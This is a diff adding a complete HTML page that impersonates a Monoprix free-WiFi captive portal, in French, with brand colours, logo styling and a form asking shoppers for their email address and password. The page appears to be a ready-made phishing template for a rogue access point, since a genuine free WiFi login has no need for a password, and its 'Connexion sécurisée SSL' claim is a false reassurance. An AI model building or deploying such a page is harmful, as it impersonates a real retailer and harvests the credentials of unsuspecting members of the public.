@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Monoprix WiFi Gratuit</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #E30613 0%, #000000 50%, #E30613 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            padding: 2rem 0;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 25% 25%, rgba(227, 6, 19, 0.2) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(0, 0, 0, 0.3) 0%, transparent 50%);
+            animation: backgroundMove 16s ease-in-out infinite;
+        }
+
+        @keyframes backgroundMove {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-10px, -10px) scale(1.02); }
+        }
+
+        .container {
+            background: linear-gradient(145deg, #ffffff 0%, #f5f5f5 100%);
+            border-radius: 20px;
+            padding: 2.5rem;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.4);
+            width: 100%;
+            max-width: 420px;
+            position: relative;
+            animation: slideIn 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 2px solid #E30613;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(100px) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .logo {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(45deg, #E30613, #000000, #E30613);
+            border-radius: 20px;
+            margin: 0 auto 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            box-shadow: 0 15px 35px rgba(227, 6, 19, 0.5);
+            animation: logoFloat 3s ease-in-out infinite;
+            border: 3px solid #000000;
+        }
+
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .logo::before {
+            content: 'M';
+            font-size: 4rem;
+            font-weight: 900;
+            color: #FFFFFF;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
+            font-family: 'Arial Black', sans-serif;
+        }
+
+        .logo::after {
+            content: '';
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            width: 30px;
+            height: 30px;
+            background: #FFFFFF;
+            border-radius: 50%;
+            border: 3px solid #E30613;
+        }
+
+        .brand-name {
+            background: linear-gradient(45deg, #E30613, #000000);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-size: 2.3rem;
+            font-weight: 900;
+            margin-bottom: 0.5rem;
+            letter-spacing: -1px;
+        }
+
+        .brand-subtitle {
+            color: #666;
+            font-size: 1rem;
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            font-style: italic;
+        }
+
+        .wifi-title {
+            color: #333;
+            font-size: 1.2rem;
+            font-weight: 400;
+            margin-bottom: 0.5rem;
+        }
+
+        .wifi-info {
+            background: linear-gradient(90deg, #E30613, #000000);
+            color: #FFFFFF;
+            padding: 0.8rem 1.5rem;
+            border-radius: 25px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            display: inline-block;
+            animation: glow 2s ease-in-out infinite alternate;
+            border: 2px solid #FFFFFF;
+        }
+
+        @keyframes glow {
+            from { 
+                box-shadow: 0 0 15px rgba(227, 6, 19, 0.5);
+                transform: scale(1);
+            }
+            to { 
+                box-shadow: 0 0 25px rgba(0, 0, 0, 0.8);
+                transform: scale(1.05);
+            }
+        }
+
+        .welcome-text {
+            text-align: center;
+            color: #333;
+            font-size: 1.1rem;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+            background: linear-gradient(135deg, #f9f9f9, #ffffff);
+            padding: 1.5rem;
+            border-radius: 15px;
+            border-left: 4px solid #E30613;
+            border-right: 4px solid #000000;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            color: #333;
+            font-weight: 700;
+            margin-bottom: 0.7rem;
+            font-size: 1rem;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 1.2rem 1.5rem;
+            border: 2px solid #E5E5E5;
+            border-radius: 15px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background: #FAFAFA;
+            outline: none;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            border-color: #E30613;
+            background: white;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(227, 6, 19, 0.3);
+        }
+
+        .connect-btn {
+            width: 100%;
+            padding: 1.3rem;
+            background: linear-gradient(135deg, #E30613 0%, #000000 100%);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            font-size: 1.2rem;
+            font-weight: 900;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 1.5rem;
+        }
+
+        .connect-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: left 0.5s;
+        }
+
+        .connect-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(227, 6, 19, 0.4);
+            background: linear-gradient(135deg, #CC0511 0%, #333333 100%);
+        }
+
+        .connect-btn:hover::before {
+            left: 100%;
+        }
+
+        .connect-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .footer-info {
+            text-align: center;
+            color: #888;
+            font-size: 0.8rem;
+            line-height: 1.4;
+            margin-top: 1rem;
+            background: rgba(245, 245, 245, 0.8);
+            padding: 1rem;
+            border-radius: 10px;
+            border: 1px solid rgba(227, 6, 19, 0.1);
+        }
+
+        .terms-link {
+            color: #E30613;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .terms-link:hover {
+            text-decoration: underline;
+            color: #000000;
+        }
+
+        .wifi-status {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #E30613;
+            border: 1px solid rgba(227, 6, 19, 0.3);
+        }
+
+        .signal-bars {
+            display: flex;
+            gap: 2px;
+        }
+
+        .bar {
+            width: 3px;
+            border-radius: 1px;
+            animation: signalStrength 1.5s ease-in-out infinite;
+        }
+
+        .bar:nth-child(1) { height: 6px; background: #E30613; animation-delay: 0s; }
+        .bar:nth-child(2) { height: 9px; background: #E30613; animation-delay: 0.2s; }
+        .bar:nth-child(3) { height: 12px; background: #000000; animation-delay: 0.4s; }
+        .bar:nth-child(4) { height: 15px; background: #000000; animation-delay: 0.6s; }
+
+        @keyframes signalStrength {
+            0%, 100% { opacity: 0.4; }
+            50% { opacity: 1; }
+        }
+
+        .particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            animation: floatParticles 18s linear infinite;
+        }
+
+        .particle:nth-child(odd) { 
+            background: #E30613; 
+            box-shadow: 0 0 8px rgba(227, 6, 19, 0.6);
+        }
+        .particle:nth-child(even) { 
+            background: #000000; 
+            box-shadow: 0 0 8px rgba(0, 0, 0, 0.8);
+        }
+
+        @keyframes floatParticles {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% {
+                transform: translateY(-100px) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .promo-banner {
+            background: linear-gradient(90deg, #E30613, #000000, #E30613);
+            color: white;
+            padding: 0.8rem;
+            margin-bottom: 1.5rem;
+            border-radius: 12px;
+            text-align: center;
+            font-weight: 700;
+            font-size: 0.9rem;
+            animation: pulse 2s ease-in-out infinite;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                margin: 1rem;
+                padding: 2rem;
+            }
+            
+            .logo {
+                width: 100px;
+                height: 100px;
+            }
+            
+            .logo::before {
+                font-size: 3rem;
+            }
+            
+            .brand-name {
+                font-size: 1.9rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles">
+        <div class="particle" style="left: 10%; animation-delay: 0s;"></div>
+        <div class="particle" style="left: 20%; animation-delay: 2s;"></div>
+        <div class="particle" style="left: 30%; animation-delay: 4s;"></div>
+        <div class="particle" style="left: 40%; animation-delay: 6s;"></div>
+        <div class="particle" style="left: 50%; animation-delay: 8s;"></div>
+        <div class="particle" style="left: 60%; animation-delay: 10s;"></div>
+        <div class="particle" style="left: 70%; animation-delay: 12s;"></div>
+        <div class="particle" style="left: 80%; animation-delay: 14s;"></div>
+        <div class="particle" style="left: 90%; animation-delay: 16s;"></div>
+    </div>
+
+    <div class="container">
+        <div class="wifi-status">
+            <div class="signal-bars">
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+            </div>
+            WiFi Monoprix
+        </div>
+
+        <div class="header">
+            <div class="logo"></div>
+            <h1 class="brand-name">Monoprix</h1>
+            <p class="brand-subtitle">L'art de vivre au quotidien</p>
+            <p class="wifi-title">WiFi Gratuit</p>
+            <div class="wifi-info">Connexion Libre</div>
+        </div>
+
+        <div class="promo-banner">
+            🎨 Découvrez l'art de vivre Monoprix !
+        </div>
+
+        <div class="welcome-text">
+            <strong>Bienvenue chez Monoprix !</strong><br>
+            Connectez-vous à notre WiFi gratuit et découvrez tous nos produits tendance pendant vos achats.
+        </div>
+
+        <form id="wifiForm" action="/" method="post">
+            <div class="form-group">
+                <label for="email">Adresse e-mail</label>
+                <input type="email" id="email" name="email" required placeholder="votre@email.com">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" required placeholder="Votre mot de passe">
+            </div>
+
+            <button type="submit" class="connect-btn" id="connectBtn">
+                🌐 Se connecter
+            </button>
+        </form>
+
+        <div class="footer-info">
+            En vous connectant, vous acceptez nos <a href="#" class="terms-link">conditions d'utilisation</a>.<br>
+            <strong>Monoprix</strong> • Connexion sécurisée SSL<br>
+            Bons achats !
+        </div>
+    </div>
+
+    <script>
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.parentElement.style.transform = 'scale(1.02)';
+                this.parentElement.style.transition = 'transform 0.3s ease';
+            });
+            
+            input.addEventListener('blur', function() {
+                this.parentElement.style.transform = 'scale(1)';
+            });
+        });
+
+        document.getElementById('wifiForm').addEventListener('submit', function(e) {
+            const btn = document.getElementById('connectBtn');
+            btn.innerHTML = '<div class="loading"></div> Connexion en cours...';
+            btn.disabled = true;
+            btn.style.background = 'linear-gradient(135deg, #CC0511, #333333)';
+        });
+
+        function createParticle() {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDelay = Math.random() * 18 + 's';
+            particle.style.animationDuration = (Math.random() * 12 + 12) + 's';
+            
+            if (Math.random() > 0.5) {
+                particle.style.background = '#E30613';
+                particle.style.boxShadow = '0 0 8px rgba(227, 6, 19, 0.6)';
+            } else {
+                particle.style.background = '#000000';
+                particle.style.boxShadow = '0 0 8px rgba(0, 0, 0, 0.8)';
+            }
+            
+            document.querySelector('.particles').appendChild(particle);
+            
+            setTimeout(() => {
+                particle.remove();
+            }, 30000);
+        }
+
+        setInterval(createParticle, 3000);
+
+        setTimeout(() => {
+            document.querySelector('.container').style.animation = 'pulse 0.5s ease-in-out';
+        }, 1000);
+    </script>
+</body>
+</html>
